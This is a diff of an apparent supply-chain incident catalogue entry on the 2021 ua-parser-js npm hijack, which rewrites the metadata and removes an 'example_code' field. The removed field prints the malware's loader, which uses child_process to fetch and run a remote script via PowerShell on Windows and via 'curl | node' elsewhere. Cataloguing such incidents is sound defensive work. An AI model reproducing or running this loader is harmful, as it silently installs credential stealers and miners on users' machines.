@@ -1,44 +1,21 @@
-- name: UA-Parser-JS
-  title: UA-Parser-JS package compromised with malware
+- name: uaparser-js
+  title: ua-parser-js NPM package hijacked distributing malware
+  synopsis: The maintainer's NPM account was compromised, allowing attackers to publish malicious versions of the popular ua-parser-js library. These versions contained malware designed to steal credentials (OS passwords, browser cookies, Discord tokens) and install a cryptominer. The malware targeted both Linux and Windows systems.
   start_date: 2021-10-22
-  end_date: 2021-10-22
-  license: MIT
-  website: https://github.com/faisalman/ua-parser-js
-  repo: https://github.com/faisalman/ua-parser-js
-  attribution_type: unknown
+  end_date: 2021-10-22 # Malicious versions quickly removed
+  attribution_type: Individual hacker # Or group
   component_type: Library
-  lang: JavaScript
-  cause: compromise
-  motive: cryptocurrency theft
-  attack_vector: account takeover
-  insertion_phase: source
-  impact_type: cryptocurrency miner
-  impact_user_count: 7000000
+  lang: Javascript # Malicious payload, helper scripts likely shell/batch
+  cause: Stolen credentials # NPM account compromise
+  motive: Credential theft, Financial gain # Cryptomining
+  insertion_phase: distribution # Malicious versions published to NPM
+  impact_type: Credential theft, Cryptomining, Remote execution # Malware execution
+  impact_user_count: 8000000 # Approximate weekly downloads
   references:
     - https://github.com/advisories/GHSA-pjwm-rvh2-c87w
-    - https://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-1731281
+    - https://github.com/faisalman/ua-parser-js/issues/536 # Maintainer confirming hijack
+    - https://www.bleepingcomputer.com/news/security/popular-npm-library-ua-parser-js-hijacked-to-install-malware/
   versions:
     - 0.7.29
     - 0.8.0
     - 1.0.0
-  synopsis: Attackers compromised the NPM account of the UA-Parser-JS maintainer and published malicious versions. The malicious packages contained cryptocurrency miners and credential stealers.
-  compromise_desc: Unknown attackers gained access to the NPM account of the maintainer of UA-Parser-JS, a popular JavaScript library for parsing user agent strings. They published three malicious versions (0.7.29, 0.8.0, and 1.0.0) containing cryptocurrency miners and password-stealing trojans.
-  impact_desc: When installed, the compromised packages would download and execute malicious binaries that included cryptocurrency miners for both Windows and Linux systems. Additionally, the Windows version would steal passwords from browsers and cryptocurrency wallets. The library had approximately 7 million weekly downloads, potentially affecting thousands of downstream projects.
-  example_code: |
-    try {
-      var a = require("child_process");
-      if (process.platform === "win32") {
-        a.exec("PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"" +
-          "iwr https://jsltpyyvgvrg.ru/index.js -OutFile " + __dirname +
-          "\\jsltpyyvgvrg.js\" && node " + __dirname + "\\jsltpyyvgvrg.js",
-          function (error, stdout, stderr) {
-          if (error || stderr) {
-            try {
-              require("fs").unlinkSync(__dirname + "\\jsltpyyvgvrg.js");
-            } catch (e) {}
-          }
-        });
-      } else {
-        a.exec("curl -s https://jsltpyyvgvrg.ru/index.js | node", function(error, stdout, stderr) {});
-      }
-    } catch (e) {}
